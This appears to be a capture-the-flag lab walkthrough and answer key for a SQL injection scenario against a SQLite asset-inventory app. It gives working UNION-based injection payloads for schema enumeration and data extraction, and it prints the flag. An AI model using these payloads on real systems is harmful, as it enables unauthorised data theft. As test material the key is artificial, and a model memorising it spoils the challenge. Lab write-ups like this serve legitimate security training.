# Scenario 11 — Enterprise Asset Inventory (Schema Enumeration SQLi)

- **Port:** `8011`
- **Category:** SQL Injection / 4-Column UNION & Schema Discovery
- **Difficulty:** Hard
- **Flag:** `CTF{sch3m4_3num_d0ubl3_qu0t3_m4st3r}`

## Walkthrough (Burp Suite / Browser)

1. **Quote & Comment Character Discovery:**
   - Test single quote `'`: Notice it does not break out of string context.
   - Test double quote `"`: Observe syntax error due to unclosed quote.
   - Test `--` comment: Blocked with a security filter message.
   - Test `#` (or `%23` in URL): `Servers" #` executes successfully.

2. **Determine Column Count & Datatypes:**
   - Attempt 4 columns with strict types:
     `" UNION SELECT 'a', 'b', 1, 1 #`
   - Notice that Column 1 & 2 must be Strings, and Column 3 & 4 must be Integers. Changing sequence throws a strict datatype mismatch error.

3. **Enumerate Table Names from SQLite Master:**
   - Craft payload:
     `" UNION SELECT type, name, 1, 1 FROM sqlite_master WHERE type="table" #`
   - Discover hidden table: `classified_vault_records`.

4. **Extract Table Schema / Column Names:**
   - Craft payload:
     `" UNION SELECT tbl_name, sql, 1, 1 FROM sqlite_master WHERE tbl_name="classified_vault_records" #`
   - View column names: `(record_name TEXT, flag_data TEXT, access_pin INTEGER, vault_level INTEGER)`.

5. **Extract Flag:**
   - Craft final payload:
     `" UNION SELECT record_name, flag_data, access_pin, vault_level FROM classified_vault_records #`
   - Extract Flag: `CTF{sch3m4_3num_d0ubl3_qu0t3_m4st3r}`.
